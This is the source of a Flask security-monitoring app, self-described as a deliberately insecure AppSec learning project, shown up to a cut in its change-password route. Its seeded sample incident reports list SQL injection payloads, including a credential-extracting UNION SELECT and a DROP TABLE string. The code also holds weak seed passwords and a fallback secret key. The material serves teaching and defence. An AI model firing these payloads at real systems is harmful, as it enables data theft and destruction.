"""
Vulnerable Flask App — AppSec Learning Project
Deliberately insecure for security audit practice.
"""
import os
import re
import sqlite3
import logging
from pathlib import Path

import markdown
import bcrypt
from datetime import datetime, timedelta
from functools import wraps
from markupsafe import Markup
from flask import Flask, render_template, request, redirect, url_for, session, abort, flash, jsonify, Response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# --- Session secret key (required for signing cookies) ---
# In production this MUST be set as a SECRET_KEY environment variable.
# The fallback is dev-only — if it's still active in production, sessions are forgeable.
_secret = os.environ.get("SECRET_KEY", "dev-only-secret-change-in-prod")
if _secret == "dev-only-secret-change-in-prod":
    import warnings
    warnings.warn("WARNING: SECRET_KEY is not set. Using insecure default — never run this in production.", stacklevel=2)
app.secret_key = _secret

# --- Security configuration (A05: Security Misconfiguration) ---
# On `main`, debug is OFF unless you explicitly opt in (local dev only).
# Phase 2: why DEBUG=True in production is dangerous (stack traces, Werkzeug PIN).
_debug = os.environ.get("FLASK_DEBUG", "").strip().lower() in ("1", "true", "yes")
app.config["DEBUG"] = _debug

DB_PATH = Path(__file__).parent / "app.db"
REPORTS_DIR = Path(__file__).parent / "docs" / "reports"

# --- Database configuration ---
# Railway sets DATABASE_URL automatically when you add a PostgreSQL service.
# Locally, this is unset and the app falls back to SQLite.
DATABASE_URL = os.environ.get("DATABASE_URL", "")
# Railway sometimes gives postgres:// — psycopg2 requires postgresql://
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# SQL placeholder: PostgreSQL uses %s, SQLite uses ?
PH = "%s" if DATABASE_URL else "?"


def get_conn():
    """
    Return a database connection.
    PostgreSQL in production (DATABASE_URL set), SQLite in local dev.
    """
    if DATABASE_URL:
        import psycopg2
        import psycopg2.extras
        return psycopg2.connect(DATABASE_URL), "pg"
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn, "sqlite"


def db_fetchone(sql, params=()):
    """Execute a SELECT and return one row as a dict, or None."""
    conn, kind = get_conn()
    try:
        if kind == "pg":
            import psycopg2.extras
            cur = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
            cur.execute(sql, params)
            row = cur.fetchone()
            return dict(row) if row else None
        else:
            row = conn.execute(sql, params).fetchone()
            return dict(row) if row else None
    finally:
        conn.close()


def db_fetchall(sql, params=()):
    """Execute a SELECT and return all rows as a list of dicts."""
    conn, kind = get_conn()
    try:
        if kind == "pg":
            import psycopg2.extras
            cur = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
            cur.execute(sql, params)
            return [dict(r) for r in cur.fetchall()]
        else:
            rows = conn.execute(sql, params).fetchall()
            return [dict(r) for r in rows]
    finally:
        conn.close()


def db_run(sql, params=()):
    """Execute an INSERT / UPDATE / CREATE and commit."""
    conn, kind = get_conn()
    try:
        if kind == "pg":
            cur = conn.cursor()
            cur.execute(sql, params)
        else:
            conn.execute(sql, params)
        conn.commit()
    finally:
        conn.close()

# --- Rate limiting (A07: brute force protection) ---
# 10 login attempts per minute per IP. Exceeding this returns HTTP 429.
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=[],
    storage_uri="memory://",
)

# --- Security logging (feeds into Splunk / Railway logs) ---
# In production (no LOG_FILE env var), logs go to stdout so Railway captures them.
# In local dev, set LOG_FILE=flask_security.log to write to disk for Splunk ingestion.
_log_file = os.environ.get("LOG_FILE")
logging.basicConfig(
    filename=_log_file if _log_file else None,
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
)
security_log = logging.getLogger("security")


_DEMO_REPORT_1 = """## Executive Summary
A sustained brute force attack was detected against your admin account over a 33-minute window. The attacker made 47 failed login attempts before successfully authenticating. The account was compromised and immediate remediation was carried out. This incident is now closed.

## Attack Timeline
- **02:14 UTC** — First failed login attempt for account `admin` from IP `203.0.113.42`
- **02:14–02:47 UTC** — 47 consecutive failed attempts at approximately 1.5 per minute
- **02:51 UTC** — Successful login recorded for `admin` from the same IP
- **02:52–03:04 UTC** — Post-compromise account activity detected
- **03:10 UTC** — Account locked, password forcibly reset by analyst

## Threat Analysis
### Brute Force — T1110 (Credential Access)
The attacker systematically tried common passwords against the `admin` account from a single IP address. The low attempt rate (~1.5/min) was designed to stay under lockout thresholds. The attack succeeded, indicating the account password did not meet complexity requirements.

**Severity:** HIGH | **Attack succeeded:** Yes — account compromised at 02:51 UTC

## Indicators of Compromise (IOCs)
| Type | Value | Context |
|------|-------|---------|
| IP Address | 203.0.113.42 | Source of all 47 failed attempts |
| Username | admin | Target account — compromised at 02:51 UTC |

## Recommended Actions
**Immediate (0–24 hours)**
- Force a password reset on the `admin` account ✅ Done
- Review all activity under `admin` since 02:51 UTC
- Block IP `203.0.113.42` at your firewall

**Short-term (1–7 days)**
- Enable multi-factor authentication on all admin accounts
- Implement account lockout after 5 failed attempts
- Audit all user accounts for weak passwords

**Long-term hardening**
- Rename or disable the default `admin` account
- Consider IP allowlisting for administrative access

## Remediation Timeline
| Action | Estimated Time | Who Does It |
|--------|---------------|-------------|
| Password reset on `admin` | 30 minutes | Analyst |
| Block attacker IP at firewall | 15 minutes | Analyst / Hosting provider |
| Review post-compromise activity logs | 2–4 hours | Analyst |
| Enable multi-factor authentication | 2–3 hours | Developer |
| Implement account lockout policy | 1–2 hours | Developer |
| Audit all user accounts for weak passwords | Half a day | Analyst + Business Owner |
| Rename/disable default `admin` account | 1 hour | Developer |

**Total estimated time to be fully protected:** 1–2 business days.

## What to Tell Your Customers
**Your customers / clients:**
No customer data was accessed during this incident. The compromised account was an internal administrative account only. You are **not required** to notify your customers about this event, and we recommend you do not — doing so may cause unnecessary concern about an incident that has been fully contained.

**Your staff:**
> *"We identified and responded to a security incident affecting one of our internal admin accounts. The issue has been fully resolved and our systems are secure. As a precaution, please ensure your account password is strong and unique — your IT team will be sending guidance shortly. If you notice anything unusual with your account, contact us immediately."*

**Legal obligations:**
Because no customer or employee personal data was accessed, this incident is unlikely to trigger mandatory breach notification requirements under GDPR or similar regulations. However, we recommend you log this incident internally and confirm with your legal adviser if you are in a regulated industry (finance, healthcare, legal). We are not providing legal advice — this is guidance only.

## Overall Risk Level
**HIGH** — Attack succeeded but was contained within 19 minutes of compromise. Password reset completed. Monitor for further activity from this IP range.
"""

_DEMO_REPORT_2 = """## Executive Summary
Three SQL injection attempts were detected via your application's search function within a nine-minute window. All three attacks were blocked by parameterised query defences. No data was accessed or modified. The attacker appears to have been probing systematically.

## Attack Timeline
- **14:22 UTC** — First injection attempt: `' OR '1'='1` via the search field
- **14:23 UTC** — Second attempt: `' UNION SELECT username, password FROM users--`
- **14:31 UTC** — Third attempt: `'; DROP TABLE users;--`
- All three payloads returned no results — database was not affected

## Threat Analysis
### SQL Injection — T1190 (Exploit Public-Facing Application)
The attacker submitted malicious SQL syntax through your public-facing search form, attempting to bypass authentication and extract credentials. The progression from a basic bypass (`OR '1'='1`) to a destructive payload (`DROP TABLE`) suggests a methodical, script-assisted attack. All attempts were neutralised by parameterised queries.

**Severity:** HIGH | **Attack succeeded:** No — all attempts blocked

## Indicators of Compromise (IOCs)
| Type | Value | Context |
|------|-------|---------|
| IP Address | 198.51.100.17 | Source of all injection attempts |
| Payload | `' OR '1'='1` | Authentication bypass attempt |
| Payload | `' UNION SELECT username, password FROM users--` | Credential extraction |
| Payload | `'; DROP TABLE users;--` | Destructive payload |

## Recommended Actions
**Immediate (0–24 hours)**
- Block IP `198.51.100.17`
- Review all requests from this IP across your full access log

**Short-term (1–7 days)**
- Confirm all database queries use parameterised statements
- Implement a Web Application Firewall (WAF)
- Add input validation and length limits to all form fields

**Long-term hardening**
- Schedule a full application security audit
- Implement automated vulnerability scanning on a regular cadence

## Remediation Timeline
| Action | Estimated Time | Who Does It |
|--------|---------------|-------------|
| Block IP `198.51.100.17` | 15 minutes | Analyst / Hosting provider |
| Review full access log for this IP | 1–2 hours | Analyst |
| Confirm parameterised queries on all routes | 2–4 hours | Developer |
| Deploy a Web Application Firewall (WAF) | Half a day | Developer / Hosting provider |
| Add input validation and field length limits | 2–4 hours | Developer |
| Schedule full application security audit | 1 week to arrange | Business Owner + Analyst |

**Total estimated time to be fully protected:** 1–2 business days.

## What to Tell Your Customers
**Your customers / clients:**
No customer data was accessed or exposed during this incident. All three injection attempts were blocked automatically by your application's defences. You are **not required** to notify your customers, and we recommend you do not — the attack did not succeed and there is no impact to report.

**Your staff:**
> *"Our security monitoring detected and blocked an attempted attack on our application this week. No data was accessed or compromised. Our analyst is reviewing the incident and strengthening our defences. No action is required from you — we will keep you updated."*

**Legal obligations:**
Because the attacks were fully blocked and no data was accessed, this incident does not trigger mandatory breach notification requirements under GDPR or similar regulations. We recommend logging this incident internally for your records. If you are in a regulated industry (finance, healthcare, legal), confirm with your legal adviser that no additional reporting is required. This is guidance only — not legal advice.

## Overall Risk Level
**HIGH** — Blocked successfully, but the attacker demonstrated intent and technical capability. Your defences held — ensure they are applied consistently across every route in your application.
"""

_DEMO_REPORT_3 = """## Executive Summary
A credential stuffing attack targeted six user accounts simultaneously from a single IP address. One account was successfully compromised, confirming the attacker used a leaked credential database containing real passwords. Immediate investigation of the affected account is required.

## Attack Timeline
- **09:04–09:11 UTC** — Failed login attempts for: `admin`, `alice`, `bob`, `support`, `test`, `user` — all from IP `192.0.2.55`
- **09:12 UTC** — Successful login recorded for account `alice` from the same IP
- Each account was attempted only 1–2 times — consistent with credential stuffing, not brute force

## Threat Analysis
### Credential Stuffing — T1110.004 (Credential Access)
Unlike brute force attacks that guess passwords repeatedly against one account, credential stuffing uses real username/password pairs obtained from previous data breaches. The fact that only 1–2 attempts were made per account — and one succeeded immediately — confirms the attacker had a list of compromised credentials. The password for `alice` was most likely obtained from a third-party breach database and had been reused on this application.

**Severity:** CRITICAL | **Attack succeeded:** Yes — `alice` compromised at 09:12 UTC

## Indicators of Compromise (IOCs)
| Type | Value | Context |
|------|-------|---------|
| IP Address | 192.0.2.55 | Source of all stuffing attempts |
| Username | alice | Account compromised — credentials found in breach data |
| Username | admin, bob, support, test, user | Probed but not compromised |

## Recommended Actions
**Immediate (0–24 hours)**
- Force a password reset on account `alice` immediately
- Terminate all active sessions for `alice`
- Review all activity under `alice` since 09:12 UTC for data access or changes
- Block IP `192.0.2.55`

**Short-term (1–7 days)**
- Notify `alice` that their credentials appeared in a third-party breach
- Force password resets for all accounts using common or previously breached passwords
- Enable multi-factor authentication across all accounts

**Long-term hardening**
- Integrate with a breach monitoring service to detect exposed credentials
- Implement anomalous login detection (new IP, unusual hours)
- Add login alerts for users when access occurs from a new device or location

## Remediation Timeline
| Action | Estimated Time | Who Does It |
|--------|---------------|-------------|
| Force password reset on `alice` | 15 minutes | Analyst |
| Terminate all active sessions for `alice` | 15 minutes | Analyst / Developer |
| Block IP `192.0.2.55` | 15 minutes | Analyst / Hosting provider |
| Review all `alice` activity since 09:12 UTC | 2–4 hours | Analyst |
| Notify `alice` that credentials were breached | 30 minutes | Business Owner (with Analyst support) |
| Audit all accounts for reused/weak passwords | Half a day | Analyst + Business Owner |
| Enable multi-factor authentication | 2–3 hours | Developer |
| Integrate breach credential monitoring | 1–2 days | Developer |
| Implement anomalous login detection | 2–3 days | Developer |

**Total estimated time to be fully protected:** 2–4 business days. The first three actions should be completed within the hour.

## What to Tell Your Customers
**Your customers / clients:**
If `alice` is a customer account, or if `alice` had access to customer data, **you may be required to notify affected customers under GDPR or equivalent data protection law.** We recommend treating this as a potential data breach until your review of `alice`'s activity confirms otherwise.

If customer data was accessed, your notification should include: what data may have been seen, when the incident occurred, what steps you have taken, and who they can contact with questions. Your analyst will provide a written summary you can use as the basis for this communication.

**Your staff:**
> *"We have identified a security incident involving one of our user accounts. Our security analyst has contained the threat and is investigating. If you use the same password on this platform as on any other service, please change it immediately. Multi-factor authentication is being enabled across all accounts as an additional precaution. If you notice anything unusual, contact us straight away."*

**Legal obligations:**
This incident may trigger mandatory breach notification requirements. Under GDPR, you have **72 hours** from becoming aware of a breach to notify your supervisory authority if personal data has been affected. If `alice`'s account contained personal data belonging to others, affected individuals must also be notified without undue delay. We strongly recommend contacting your legal adviser today. We are not providing legal advice — this is guidance only, and timing is critical.

## Overall Risk Level
**CRITICAL** — A real user account was compromised using credentials stolen from a third-party breach. The attacker has authenticated access. Treat this as an active incident until the `alice` account is fully investigated and secured.
"""


def _seed_demo_reports(demo_user_id):
    """Seed three realistic pre-written reports for the demo user.
    Always refreshes content so updated report sections appear after redeploy.
    """
    demo_data = [
        # (days_ago, threat_count, event_count, status, content)
        (7,  1, 49, "closed",    _DEMO_REPORT_1),
        (3,  1,  5, "reviewing", _DEMO_REPORT_2),
        (0,  1, 14, "new",       _DEMO_REPORT_3),
    ]

    existing = db_fetchall(
        f"SELECT id FROM reports WHERE owner_id = {PH} ORDER BY created_at ASC",
        (demo_user_id,),
    )

    if existing and len(existing) == len(demo_data):
        # Reports already exist — refresh content so new sections appear after redeploy
        for row, (_, tc, ec, status, content) in zip(existing, demo_data):
            db_run(
                f"UPDATE reports SET content = {PH} WHERE id = {PH}",
                (content, row["id"]),
            )
        return

    # No reports yet — delete any partial rows and insert fresh
    db_run(f"DELETE FROM reports WHERE owner_id = {PH}", (demo_user_id,))
    now = datetime.utcnow()
    for days_ago, tc, ec, status, content in demo_data:
        ts = (now - timedelta(days=days_ago)).strftime("%Y-%m-%d %H:%M:%S")
        db_run(
            f"INSERT INTO reports (created_at, threat_count, event_count, content, status, owner_id)"
            f" VALUES ({PH},{PH},{PH},{PH},{PH},{PH})",
            (ts, tc, ec, content, status, demo_user_id),
        )


def init_db():
    """
    Create schema and optionally seed lab users.
    Works with both PostgreSQL (production) and SQLite (local dev).
    Passwords are hashed with bcrypt — never stored in plaintext (A02 fix).
    """
    # PostgreSQL uses SERIAL for auto-increment; SQLite uses INTEGER PRIMARY KEY
    if DATABASE_URL:
        id_col = "id SERIAL PRIMARY KEY"
    else:
        id_col = "id INTEGER PRIMARY KEY"

    db_run(f"""
        CREATE TABLE IF NOT EXISTS users (
            {id_col},
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role     TEXT NOT NULL DEFAULT 'client'
        )
    """)
    # Migration: add role and api_key columns to users.
    if DATABASE_URL:
        db_run("ALTER TABLE users ADD COLUMN IF NOT EXISTS role    TEXT NOT NULL DEFAULT 'client'")
        db_run("ALTER TABLE users ADD COLUMN IF NOT EXISTS api_key TEXT")
    else:
        existing_cols = [r["name"] for r in db_fetchall("PRAGMA table_info(users)")]
        if "role"    not in existing_cols:
            db_run("ALTER TABLE users ADD COLUMN role    TEXT NOT NULL DEFAULT 'client'")
        if "api_key" not in existing_cols:
            db_run("ALTER TABLE users ADD COLUMN api_key TEXT")

    # Generate API keys for any existing users that don't have one yet.
    import secrets as _secrets
    users_without_key = db_fetchall(f"SELECT id FROM users WHERE api_key IS NULL OR api_key = ''")
    for u in users_without_key:
        db_run(f"UPDATE users SET api_key = {PH} WHERE id = {PH}",
               (_secrets.token_urlsafe(32), u["id"]))

    # Reports table — stores AI-generated incident reports persistently.
    # On Railway the filesystem is ephemeral (wiped on redeploy), so we keep
    # reports in PostgreSQL so they survive deployments.
    if DATABASE_URL:
        ts_col = "created_at TIMESTAMP NOT NULL DEFAULT NOW()"
    else:
        ts_col = "created_at TEXT NOT NULL DEFAULT (datetime('now'))"

    db_run(f"""
        CREATE TABLE IF NOT EXISTS reports (
            {id_col},
            {ts_col},
            threat_count INTEGER NOT NULL DEFAULT 0,
            event_count  INTEGER NOT NULL DEFAULT 0,
            content TEXT NOT NULL
        )
    """)
    # Migration: add event_count, status, analyst_notes, owner_id to reports.
    if DATABASE_URL:
        db_run("ALTER TABLE reports ADD COLUMN IF NOT EXISTS event_count    INTEGER NOT NULL DEFAULT 0")
        db_run("ALTER TABLE reports ADD COLUMN IF NOT EXISTS status         TEXT    NOT NULL DEFAULT 'new'")
        db_run("ALTER TABLE reports ADD COLUMN IF NOT EXISTS analyst_notes  TEXT    NOT NULL DEFAULT ''")
        db_run("ALTER TABLE reports ADD COLUMN IF NOT EXISTS owner_id       INTEGER")
    else:
        existing_cols = [r["name"] for r in db_fetchall("PRAGMA table_info(reports)")]
        if "event_count"   not in existing_cols:
            db_run("ALTER TABLE reports ADD COLUMN event_count   INTEGER NOT NULL DEFAULT 0")
        if "status"        not in existing_cols:
            db_run("ALTER TABLE reports ADD COLUMN status        TEXT    NOT NULL DEFAULT 'new'")
        if "analyst_notes" not in existing_cols:
            db_run("ALTER TABLE reports ADD COLUMN analyst_notes TEXT    NOT NULL DEFAULT ''")
        if "owner_id"      not in existing_cols:
            db_run("ALTER TABLE reports ADD COLUMN owner_id      INTEGER")

    # Security events table — stores simulated / real attack events for the agent to read.
    # On Railway there is no LOG_FILE, so /simulate-attack writes here instead.
    # /run-agent reads from this table (plus the log file if available) and clears it after processing.
    db_run(f"""
        CREATE TABLE IF NOT EXISTS security_events (
            {id_col},
            {ts_col},
            event_type TEXT NOT NULL,
            username   TEXT NOT NULL DEFAULT '',
            ip         TEXT NOT NULL DEFAULT '',
            extra      TEXT NOT NULL DEFAULT '',
            processed  INTEGER NOT NULL DEFAULT 0
        )
    """)
    # Migration: add processed and owner_id to security_events.
    if DATABASE_URL:
        db_run("ALTER TABLE security_events ADD COLUMN IF NOT EXISTS processed INTEGER NOT NULL DEFAULT 0")
        db_run("ALTER TABLE security_events ADD COLUMN IF NOT EXISTS owner_id  INTEGER")
    else:
        existing_cols = [r["name"] for r in db_fetchall("PRAGMA table_info(security_events)")]
        if "processed" not in existing_cols:
            db_run("ALTER TABLE security_events ADD COLUMN processed INTEGER NOT NULL DEFAULT 0")
        if "owner_id"  not in existing_cols:
            db_run("ALTER TABLE security_events ADD COLUMN owner_id  INTEGER")

    # Auto-create analyst account on startup if ANALYST_USERNAME + ANALYST_PASSWORD are set.
    # This means even if Railway wipes the DB, the analyst account is recreated automatically
    # on the next deploy — no manual re-registration needed.
    analyst_username = os.environ.get("ANALYST_USERNAME", "").strip()
    analyst_password = os.environ.get("ANALYST_PASSWORD", "").strip()
    if analyst_username and analyst_password:
        existing = db_fetchone(f"SELECT id FROM users WHERE username = {PH}", (analyst_username,))
        if not existing:
            hashed = bcrypt.hashpw(analyst_password.encode(), bcrypt.gensalt())
            db_run(
                f"INSERT INTO users (username, password, role) VALUES ({PH}, {PH}, 'analyst')",
                (analyst_username, hashed.decode()),
            )

    # Triage log — every status change on a report is recorded with a timestamp.
    # Used by the analyst scorecard to compute response times and escalation rates.
    if DATABASE_URL:
        triage_ts = "changed_at TIMESTAMP NOT NULL DEFAULT NOW()"
    else:
        triage_ts = "changed_at TEXT NOT NULL DEFAULT (datetime('now'))"
    db_run(f"""
        CREATE TABLE IF NOT EXISTS triage_log (
            {id_col},
            report_id  INTEGER NOT NULL,
            old_status TEXT    NOT NULL DEFAULT '',
            new_status TEXT    NOT NULL,
            {triage_ts}
        )
    """)

    # Migration: add notes_updated_at to reports (tracks discipline — did Jason
    # write notes before or after reading the AI report?)
    if DATABASE_URL:
        db_run("ALTER TABLE reports ADD COLUMN IF NOT EXISTS notes_updated_at TIMESTAMP")
    else:
        existing_cols = [r["name"] for r in db_fetchall("PRAGMA table_info(reports)")]
        if "notes_updated_at" not in existing_cols:
            db_run("ALTER TABLE reports ADD COLUMN notes_updated_at TEXT")

    # Breach intelligence table — stores AI-curated breach/incident reports from RSS feeds
    db_run(f"""
        CREATE TABLE IF NOT EXISTS breach_intel (
            {id_col},
            {ts_col},
            title     TEXT    NOT NULL DEFAULT '',
            source    TEXT    NOT NULL DEFAULT '',
            url       TEXT    NOT NULL DEFAULT '',
            summary   TEXT    NOT NULL DEFAULT '',
            severity  TEXT    NOT NULL DEFAULT 'MEDIUM',
            dismissed INTEGER NOT NULL DEFAULT 0,
            archived  INTEGER NOT NULL DEFAULT 0
        )
    """)
    # Migration: add dismissed and archived columns to existing breach_intel tables
    if DATABASE_URL:
        db_run("ALTER TABLE breach_intel ADD COLUMN IF NOT EXISTS dismissed INTEGER NOT NULL DEFAULT 0")
        db_run("ALTER TABLE breach_intel ADD COLUMN IF NOT EXISTS archived  INTEGER NOT NULL DEFAULT 0")
    else:
        existing_cols = [r["name"] for r in db_fetchall("PRAGMA table_info(breach_intel)")]
        if "dismissed" not in existing_cols:
            db_run("ALTER TABLE breach_intel ADD COLUMN dismissed INTEGER NOT NULL DEFAULT 0")
        if "archived" not in existing_cols:
            db_run("ALTER TABLE breach_intel ADD COLUMN archived  INTEGER NOT NULL DEFAULT 0")

    # Training mode — MITRE reading progress tracker
    db_run(f"""
        CREATE TABLE IF NOT EXISTS training_mitre_progress (
            {id_col},
            analyst_id   INTEGER NOT NULL,
            technique_id TEXT    NOT NULL,
            read_at      TEXT    NOT NULL DEFAULT (datetime('now')),
            UNIQUE(analyst_id, technique_id)
        )
    """)

    # Training mode — scenario attempt records with answers and scores
    db_run(f"""
        CREATE TABLE IF NOT EXISTS training_attempts (
            {id_col},
            analyst_id        INTEGER NOT NULL,
            scenario_name     TEXT    NOT NULL,
            scenario_label    TEXT    NOT NULL,
            started_at        TEXT    NOT NULL DEFAULT (datetime('now')),
            submitted_at      TEXT,
            report_id         INTEGER,
            actual_techniques TEXT    NOT NULL DEFAULT '[]',
            actual_attacker_ip TEXT   NOT NULL DEFAULT '',
            actual_succeeded  INTEGER NOT NULL DEFAULT 0,
            answer_techniques TEXT,
            answer_ip         TEXT,
            answer_succeeded  TEXT,
            answer_iocs       TEXT,
            answer_response   TEXT,
            score_techniques  INTEGER,
            score_ip          INTEGER,
            score_succeeded   INTEGER,
            score_iocs        INTEGER,
            score_response    INTEGER,
            score_total       INTEGER,
            ai_feedback_iocs     TEXT,
            ai_feedback_response TEXT,
            ai_feedback_overall  TEXT
        )
    """)

    # CISSP study progress — one row per analyst per domain
    db_run(f"""
        CREATE TABLE IF NOT EXISTS cissp_progress (
            {id_col},
            analyst_id   INTEGER NOT NULL,
            domain_num   INTEGER NOT NULL,
            attempts     INTEGER NOT NULL DEFAULT 0,
            correct      INTEGER NOT NULL DEFAULT 0,
            last_studied_at TEXT,
            UNIQUE(analyst_id, domain_num)
        )
    """)

    # CISSP question attempts — each AI-generated question + user answer
    db_run(f"""
        CREATE TABLE IF NOT EXISTS cissp_attempts (
            {id_col},
            {ts_col},
            analyst_id      INTEGER NOT NULL,
            domain_num      INTEGER NOT NULL,
            scenario        TEXT    NOT NULL DEFAULT '',
            question_text   TEXT    NOT NULL DEFAULT '',
            options_json    TEXT    NOT NULL DEFAULT '{{}}',
            correct_answer  TEXT    NOT NULL DEFAULT '',
            user_answer     TEXT,
            explanation     TEXT    NOT NULL DEFAULT '',
            mindset         TEXT    NOT NULL DEFAULT 'manager',
            difficulty      INTEGER NOT NULL DEFAULT 2,
            is_correct      INTEGER,
            skipped         INTEGER NOT NULL DEFAULT 0
        )
    """)

    # RPG player profile — one row per analyst, XP, level, streaks
    db_run(f"""
        CREATE TABLE IF NOT EXISTS player_profile (
            {id_col},
            analyst_id              INTEGER NOT NULL UNIQUE,
            xp                      INTEGER NOT NULL DEFAULT 0,
            level                   INTEGER NOT NULL DEFAULT 1,
            streak_days             INTEGER NOT NULL DEFAULT 0,
            last_xp_date            TEXT,
            total_correct_cissp     INTEGER NOT NULL DEFAULT 0,
            total_scans             INTEGER NOT NULL DEFAULT 0,
            total_findings_resolved INTEGER NOT NULL DEFAULT 0
        )
    """)

    # XP transaction log — full history of every XP award
    db_run(f"""
        CREATE TABLE IF NOT EXISTS xp_log (
            {id_col},
            {ts_col},
            analyst_id INTEGER NOT NULL,
            amount     INTEGER NOT NULL,
            reason     TEXT    NOT NULL DEFAULT '',
            source     TEXT    NOT NULL DEFAULT ''
        )
    """)

    # Achievement badges earned
    db_run(f"""
        CREATE TABLE IF NOT EXISTS player_achievements (
            {id_col},
            {ts_col},
            analyst_id INTEGER NOT NULL,
            badge_id   TEXT    NOT NULL,
            UNIQUE(analyst_id, badge_id)
        )
    """)

    # System security findings — stored results from real machine/network scans
    db_run(f"""
        CREATE TABLE IF NOT EXISTS system_findings (
            {id_col},
            {ts_col},
            finding_id     TEXT    NOT NULL,
            title          TEXT    NOT NULL DEFAULT '',
            severity       TEXT    NOT NULL DEFAULT 'MEDIUM',
            cissp_domain   INTEGER NOT NULL DEFAULT 1,
            category       TEXT    NOT NULL DEFAULT '',
            description    TEXT    NOT NULL DEFAULT '',
            recommendation TEXT    NOT NULL DEFAULT '',
            raw_output     TEXT    NOT NULL DEFAULT '',
            resolved       INTEGER NOT NULL DEFAULT 0,
            resolved_at    TEXT,
            scan_type      TEXT    NOT NULL DEFAULT 'machine'
        )
    """)

    # Only seed if the table is empty AND SEED_DB=true is explicitly set.
    # In production (Railway), SEED_DB is not set — first user is created via /register.
    # In local dev, set SEED_DB=true to get the lab test accounts.
    row = db_fetchone(f"SELECT COUNT(*) AS cnt FROM users")
    if row["cnt"] == 0 and os.environ.get("SEED_DB", "").lower() == "true":
        seed_users = [
            ("admin", "admin123"),
            ("alice", "alice456"),
            ("bob",   "bob789"),
        ]
        for username, plaintext in seed_users:
            hashed = bcrypt.hashpw(plaintext.encode(), bcrypt.gensalt())
            db_run(
                f"INSERT INTO users (username, password) VALUES ({PH}, {PH})",
                (username, hashed.decode()),
            )

    # Demo user — created after seed so the cnt==0 check above is not skewed.
    # Password is a random secret (never used — /demo bypasses auth entirely).
    import secrets as _secrets
    demo_user = db_fetchone(f"SELECT id FROM users WHERE username = {PH}", ("demo",))
    if not demo_user:
        _demo_pw  = bcrypt.hashpw(_secrets.token_urlsafe(32).encode(), bcrypt.gensalt())
        _demo_key = _secrets.token_urlsafe(32)
        db_run(
            f"INSERT INTO users (username, password, role, api_key) VALUES ({PH},{PH},'client',{PH})",
            ("demo", _demo_pw.decode(), _demo_key),
        )
        demo_user = db_fetchone(f"SELECT id FROM users WHERE username = {PH}", ("demo",))
    if demo_user:
        _seed_demo_reports(demo_user["id"])


# --- Password validation helper ---
def validate_password(password):
    """
    Enforce password policy. Returns an error string or None if valid.
    Single source of truth — used by /register and /change-password.

    Rules (A07: Authentication Failures):
    - 12+ characters
    - At least one uppercase letter
    - At least one number
    - At least one special character
    """
    if len(password) < 12:
        return "Password must be at least 12 characters."
    if not re.search(r"[A-Z]", password):
        return "Password must contain at least one uppercase letter."
    if not re.search(r"[0-9]", password):
        return "Password must contain at least one number."
    if not re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>\/?`~]", password):
        return "Password must contain at least one special character (!@#$%^&* etc)."
    return None


# --- Auth decorators ---
def login_required(f):
    """Redirect to login if the user has no active session."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated


def analyst_required(f):
    """Block non-analyst accounts from analyst-only routes (A01: Broken Access Control)."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return redirect(url_for("login"))
        if session.get("role") != "analyst":
            abort(403)
        return f(*args, **kwargs)
    return decorated


# --- ROUTE 0: Demo (public — no login required) ---
@app.route("/demo")
def demo():
    """
    Public demo login — auto-authenticates as the pre-seeded demo user.
    No credentials required. Designed to be shared by Peta with prospects.
    The demo user can only view their pre-seeded reports — no controls exposed.
    """
    user = db_fetchone(f"SELECT * FROM users WHERE username = {PH}", ("demo",))
    if not user:
        flash("Demo account is not available right now.", "warning")
        return redirect(url_for("index"))
    session.clear()
    session["username"] = "demo"
    session["user_id"]  = user["id"]
    session["role"]     = "client"
    session["is_demo"]  = True
    return redirect(url_for("reports"))


# --- ROUTE 0: Login / Logout (A01: Broken Access Control, A07: Auth Failures) ---
@app.route("/login", methods=["GET", "POST"])
@limiter.limit("10 per minute")
def login():
    """
    Block job: authenticate the user against hashed credentials in the DB.
    On success, store username in the signed session cookie.
    On failure, return a generic error — never reveal which field was wrong.
    """
    # Already logged in — send straight to the right dashboard
    if "username" in session:
        if session.get("role") == "analyst":
            return redirect(url_for("control_room"))
        return redirect(url_for("reports"))

    error = None

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        # Look up user by username
        row = db_fetchone(f"SELECT * FROM users WHERE username = {PH}", (username,))

        # Verify password against stored hash
        if row and bcrypt.checkpw(password.encode(), row["password"].encode()):
            # Auto-upgrade analyst account based on ANALYST_USERNAME env var.
            # Wrapped in try/except so a DB migration lag never blocks login.
            analyst_name = os.environ.get("ANALYST_USERNAME", "").strip().lower()
            if analyst_name and username.lower() == analyst_name and row.get("role") != "analyst":
                try:
                    db_run(f"UPDATE users SET role = 'analyst' WHERE username = {PH}", (username,))
                    row["role"] = "analyst"
                except Exception as exc:
                    security_log.warning(f"ANALYST_UPGRADE_FAILED username={username} error={exc}")

            session["username"] = username
            session["user_id"]  = row["id"]
            session["role"]     = row.get("role", "client")
            security_log.info(f"LOGIN_SUCCESS username={username} ip={request.remote_addr}")
            # Analysts go to the Control Room; clients go to the reports dashboard.
            if session["role"] == "analyst":
                return redirect(url_for("control_room"))
            return redirect(url_for("reports"))
        else:
            security_log.warning(f"LOGIN_FAILED username={username} ip={request.remote_addr}")
            error = "Invalid username or password."  # generic — don't hint which field failed

    return render_template("login.html", error=error)


@app.route("/logout")
def logout():
    """Clear the session and redirect to login."""
    session.clear()
    return redirect(url_for("login"))


# --- ROUTE 0c: Change Password (A07: Auth Failures) ---
@app.route("/change-password", methods=["GET", "POST"])
@login_required
@limiter.limit("5 per minute")
def change_password():
    if session.get("is_demo"):
        flash("Password changes are not available in the demo account.", "info")
        return redirect(url_for("reports"))
    """
    Allow a logged-in user to change their own password.

    Trust boundary: verifies current password before accepting a new one.
